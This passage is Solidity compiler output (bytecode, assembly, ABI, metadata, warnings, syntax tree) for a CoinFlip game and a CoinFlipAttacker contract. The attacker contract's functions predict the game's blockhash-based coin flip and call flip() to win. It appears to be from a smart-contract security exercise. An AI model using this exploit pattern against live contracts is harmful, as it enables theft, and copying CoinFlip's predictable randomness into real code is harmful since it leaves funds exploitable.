											"begin": 3859,
											"end": 3864,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3859,
											"end": 3864,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "58"
										},
										{
											"begin": 3859,
											"end": 3864,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 3859,
											"end": 3864,
											"name": "INVALID",
											"source": 1
										},
										{
											"begin": 3859,
											"end": 3864,
											"name": "tag",
											"source": 1,
											"value": "58"
										},
										{
											"begin": 3859,
											"end": 3864,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3859,
											"end": 3864,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 3847,
											"end": 3864,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3847,
											"end": 3864,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3968,
											"end": 3969,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3961,
											"end": 3969,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3961,
											"end": 3969,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3961,
											"end": 3969,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3638,
											"end": 3976,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 3638,
											"end": 3976,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 3638,
											"end": 3976,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3638,
											"end": 3976,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3638,
											"end": 3976,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3638,
											"end": 3976,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"attackByCall()": "1a13ff68",
							"attackByIns()": "83e00525",
							"attackByInterface()": "b6f02db9"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attackByCall\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"attackByIns\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"attackByInterface\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contract/security/CoinFlipAttacker.sol\":\"CoinFlipAttacker\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contract/security/CoinFlipAttacker.sol\":{\"keccak256\":\"0x2d3298c7bf49338d41f8ec4375a112197f62fe3cf759a986a516ad7f781b1f58\",\"urls\":[\"bzz-raw://4da655b5fd6d69ae9aa804d0bc4310502a0c26d6f9e9eca57d46d6ac3c1048c4\",\"dweb:/ipfs/QmaFabkqnEMTWyFRFJashjJ9HYghBQAKMxXX1ZZqkSZE9B\"]},\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":{\"keccak256\":\"0x04d34b3cd5677bea25f8dfceb6dec0eaa071d4d4b789a43f13fe0c415ba4c296\",\"urls\":[\"bzz-raw://e7e8b526a6839e5ba14f0d23a830387fec47f7043ce01d42c9f285b709a9d080\",\"dweb:/ipfs/QmXmhhFmX5gcAvVzNiDPAGA35iHMPNaYtQkACswRHBVTNw\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 100,
								"contract": "contract/security/CoinFlipAttacker.sol:CoinFlipAttacker",
								"label": "addr",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							},
							{
								"astId": 102,
								"contract": "contract/security/CoinFlipAttacker.sol:CoinFlipAttacker",
								"label": "cf_ins",
								"offset": 0,
								"slot": "1",
								"type": "t_contract(CoinFlip)87"
							},
							{
								"astId": 104,
								"contract": "contract/security/CoinFlipAttacker.sol:CoinFlipAttacker",
								"label": "cf_interface",
								"offset": 0,
								"slot": "2",
								"type": "t_contract(CoinFlipInterface)95"
							},
							{
								"astId": 107,
								"contract": "contract/security/CoinFlipAttacker.sol:CoinFlipAttacker",
								"label": "FACTOR",
								"offset": 0,
								"slot": "3",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_contract(CoinFlip)87": {
								"encoding": "inplace",
								"label": "contract CoinFlip",
								"numberOfBytes": "20"
							},
							"t_contract(CoinFlipInterface)95": {
								"encoding": "inplace",
								"label": "contract CoinFlipInterface",
								"numberOfBytes": "20"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"CoinFlipInterface": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "bool",
									"name": "_guess",
									"type": "bool"
								}
							],
							"name": "flip",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"flip(bool)": "1d263f67"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_guess\",\"type\":\"bool\"}],\"name\":\"flip\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contract/security/CoinFlipAttacker.sol\":\"CoinFlipInterface\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contract/security/CoinFlipAttacker.sol\":{\"keccak256\":\"0x2d3298c7bf49338d41f8ec4375a112197f62fe3cf759a986a516ad7f781b1f58\",\"urls\":[\"bzz-raw://4da655b5fd6d69ae9aa804d0bc4310502a0c26d6f9e9eca57d46d6ac3c1048c4\",\"dweb:/ipfs/QmaFabkqnEMTWyFRFJashjJ9HYghBQAKMxXX1ZZqkSZE9B\"]},\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":{\"keccak256\":\"0x04d34b3cd5677bea25f8dfceb6dec0eaa071d4d4b789a43f13fe0c415ba4c296\",\"urls\":[\"bzz-raw://e7e8b526a6839e5ba14f0d23a830387fec47f7043ce01d42c9f285b709a9d080\",\"dweb:/ipfs/QmXmhhFmX5gcAvVzNiDPAGA35iHMPNaYtQkACswRHBVTNw\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol": {
				"SafeMath": {
					"abi": [],
					"devdoc": {
						"details": "Wrappers over Solidity's arithmetic operations with added overflow checks. Arithmetic operations in Solidity wrap on overflow. This can easily result in bugs, because programmers usually assume that an overflow raises an error, which is the standard behavior in high level programming languages. `SafeMath` restores this intuition by reverting the transaction when an operation overflows. Using this library instead of the unchecked operations eliminates an entire class of bugs, so it's recommended to use it always.",
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":589:5177  library SafeMath {... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n  0x0b\n  dup3\n  dup3\n  dup3\n  codecopy\n  dup1\n  mload\n  0x00\n  byte\n  0x73\n  eq\n  tag_1\n  jumpi\n  invalid\ntag_1:\n  mstore(0x00, address)\n  0x73\n  dup2\n  mstore8\n  dup3\n  dup2\n  return\nstop\n\nsub_0: assembly {\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":589:5177  library SafeMath {... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa2646970667358221220388599874c31e4194f4f20ed13a8a1022480cea6cb14f6f9221687407769026064736f6c634300060c0033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60566023600b82828239805160001a607314601657fe5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea2646970667358221220388599874c31e4194f4f20ed13a8a1022480cea6cb14f6f9221687407769026064736f6c634300060c0033",
							"opcodes": "PUSH1 0x56 PUSH1 0x23 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x16 JUMPI INVALID JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CODESIZE DUP6 SWAP10 DUP8 0x4C BALANCE 0xE4 NOT 0x4F 0x4F KECCAK256 0xED SGT 0xA8 LOG1 MUL 0x24 DUP1 0xCE 0xA6 0xCB EQ 0xF6 0xF9 0x22 AND DUP8 BLOCKHASH PUSH24 0x69026064736F6C634300060C003300000000000000000000 ",
							"sourceMap": "589:4588:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600080fdfea2646970667358221220388599874c31e4194f4f20ed13a8a1022480cea6cb14f6f9221687407769026064736f6c634300060c0033",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CODESIZE DUP6 SWAP10 DUP8 0x4C BALANCE 0xE4 NOT 0x4F 0x4F KECCAK256 0xED SGT 0xA8 LOG1 MUL 0x24 DUP1 0xCE 0xA6 0xCB EQ 0xF6 0xF9 0x22 AND DUP8 BLOCKHASH PUSH24 0x69026064736F6C634300060C003300000000000000000000 ",
							"sourceMap": "589:4588:1:-:0;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17200",
								"executionCost": "97",
								"totalCost": "17297"
							},
							"internal": {
								"add(uint256,uint256)": "infinite",
								"div(uint256,uint256)": "infinite",
								"div(uint256,uint256,string memory)": "infinite",
								"mod(uint256,uint256)": "infinite",
								"mod(uint256,uint256,string memory)": "infinite",
								"mul(uint256,uint256)": "infinite",
								"sub(uint256,uint256)": "infinite",
								"sub(uint256,uint256,string memory)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 589,
									"end": 5177,
									"name": "PUSH #[$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "PUSH [$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "PUSH",
									"source": 1,
									"value": "B"
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "BYTE",
									"source": 1
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "PUSH",
									"source": 1,
									"value": "73"
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "EQ",
									"source": 1
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "INVALID",
									"source": 1
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "tag",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "ADDRESS",
									"source": 1
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "PUSH",
									"source": 1,
									"value": "73"
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "MSTORE8",
									"source": 1
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 589,
									"end": 5177,
									"name": "RETURN",
									"source": 1
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220388599874c31e4194f4f20ed13a8a1022480cea6cb14f6f9221687407769026064736f6c634300060c0033",
									".code": [
										{
											"begin": 589,
											"end": 5177,
											"name": "PUSHDEPLOYADDRESS",
											"source": 1
										},
										{
											"begin": 589,
											"end": 5177,
											"name": "ADDRESS",
											"source": 1
										},
										{
											"begin": 589,
											"end": 5177,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 589,
											"end": 5177,
											"name": "PUSH",
											"source": 1,
											"value": "80"
										},
										{
											"begin": 589,
											"end": 5177,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 589,
											"end": 5177,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 589,
											"end": 5177,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 589,
											"end": 5177,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 589,
											"end": 5177,
											"name": "REVERT",
											"source": 1
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"details\":\"Wrappers over Solidity's arithmetic operations with added overflow checks. Arithmetic operations in Solidity wrap on overflow. This can easily result in bugs, because programmers usually assume that an overflow raises an error, which is the standard behavior in high level programming languages. `SafeMath` restores this intuition by reverting the transaction when an operation overflows. Using this library instead of the unchecked operations eliminates an entire class of bugs, so it's recommended to use it always.\",\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":\"SafeMath\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":{\"keccak256\":\"0x04d34b3cd5677bea25f8dfceb6dec0eaa071d4d4b789a43f13fe0c415ba4c296\",\"urls\":[\"bzz-raw://e7e8b526a6839e5ba14f0d23a830387fec47f7043ce01d42c9f285b709a9d080\",\"dweb:/ipfs/QmXmhhFmX5gcAvVzNiDPAGA35iHMPNaYtQkACswRHBVTNw\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "1878",
				"formattedMessage": "contract/security/CoinFlipAttacker.sol: Warning: SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.\n",
				"message": "SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.",
				"severity": "warning",
				"sourceLocation": {
					"end": -1,
					"file": "contract/security/CoinFlipAttacker.sol",
					"start": -1
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "1878",
				"formattedMessage": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol: Warning: SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.\n",
				"message": "SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.",
				"severity": "warning",
				"sourceLocation": {
					"end": -1,
					"file": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol",
					"start": -1
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "9302",
				"formattedMessage": "contract/security/CoinFlipAttacker.sol:81:9: Warning: Return value of low-level calls not used.\n        addr.call(abi.encodeWithSignature(\"flip(bool)\",side));\n        ^---------------------------------------------------^\n",
				"message": "Return value of low-level calls not used.",
				"severity": "warning",
				"sourceLocation": {
					"end": 2485,
					"file": "contract/security/CoinFlipAttacker.sol",
					"start": 2432
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "2018",
				"formattedMessage": "contract/security/CoinFlipAttacker.sol:59:5: Warning: Function state mutability can be restricted to view\n    function getFlip() private returns (bool) {\n    ^ (Relevant source part starts here and spans across multiple lines).\n",
				"message": "Function state mutability can be restricted to view",
				"severity": "warning",
				"sourceLocation": {
					"end": 1942,
					"file": "contract/security/CoinFlipAttacker.sol",
					"start": 1696
				},
				"type": "Warning"
			}
		],
		"sources": {
			"contract/security/CoinFlipAttacker.sol": {
				"ast": {
					"absolutePath": "contract/security/CoinFlipAttacker.sol",
					"exportedSymbols": {
						"CoinFlip": [
							87
						],
						"CoinFlipAttacker": [
							216
						],
						"CoinFlipInterface": [
							95
						]
					},
					"id": 217,
					"license": null,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "0:23:0"
						},
						{
							"absolutePath": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol",
							"file": "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol",
							"id": 2,
							"nodeType": "ImportDirective",
							"scope": 217,
							"sourceUnit": 413,
							"src": "76:104:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 87,
							"linearizedBaseContracts": [
								87
							],
							"name": "CoinFlip",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"id": 5,
									"libraryName": {
										"contractScope": null,
										"id": 3,
										"name": "SafeMath",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 412,
										"src": "284:8:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_SafeMath_$412",
											"typeString": "library SafeMath"
										}
									},
									"nodeType": "UsingForDirective",
									"src": "278:27:0",
									"typeName": {
										"id": 4,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "297:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									}
								},
								{
									"constant": false,
									"functionSelector": "e6f334d7",
									"id": 7,
									"mutability": "mutable",
									"name": "consecutiveWins",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 87,
									"src": "309:30:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 6,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "309:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 9,
									"mutability": "mutable",
									"name": "lastHash",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 87,
									"src": "344:16:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 8,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "344:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 12,
									"mutability": "mutable",
									"name": "FACTOR",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 87,
									"src": "365:94:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 10,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "365:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
										"id": 11,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "382:77:0",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
											"typeString": "int_const 5789...(69 digits omitted)...9968"
										},
										"value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 19,
										"nodeType": "Block",
										"src": "487:32:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 17,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 15,
														"name": "consecutiveWins",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 7,
														"src": "494:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 16,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "512:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "494:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 18,
												"nodeType": "ExpressionStatement",
												"src": "494:19:0"
											}
										]
									},
									"documentation": null,
									"id": 20,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 13,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "477:2:0"
									},
									"returnParameters": {
										"id": 14,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "487:0:0"
									},
									"scope": 87,
									"src": "466:53:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 85,
										"nodeType": "Block",
										"src": "574:404:0",
										"statements": [
											{
												"assignments": [
													28
												],
												"declarations": [
													{
														"constant": false,
														"id": 28,
														"mutability": "mutable",
														"name": "blockValue",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 85,
														"src": "581:18:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 27,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "581:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 39,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"hexValue": "31",
																			"id": 35,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "637:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_1_by_1",
																				"typeString": "int_const 1"
																			},
																			"value": "1"
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_rational_1_by_1",
																				"typeString": "int_const 1"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"expression": {
																				"argumentTypes": null,
																				"id": 32,
																				"name": "block",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": -4,
																				"src": "620:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_magic_block",
																					"typeString": "block"
																				}
																			},
																			"id": 33,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"memberName": "number",
																			"nodeType": "MemberAccess",
																			"referencedDeclaration": null,
																			"src": "620:12:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 34,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sub",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 262,
																		"src": "620:16:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																			"typeString": "function (uint256,uint256) pure returns (uint256)"
																		}
																	},
																	"id": 36,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "620:19:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 31,
																"name": "blockhash",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": -5,
																"src": "610:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
																	"typeString": "function (uint256) view returns (bytes32)"
																}
															},
															"id": 37,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "610:30:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														],
														"id": 30,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "602:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint256_$",
															"typeString": "type(uint256)"
														},
														"typeName": {
															"id": 29,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "602:7:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 38,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "602:39:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
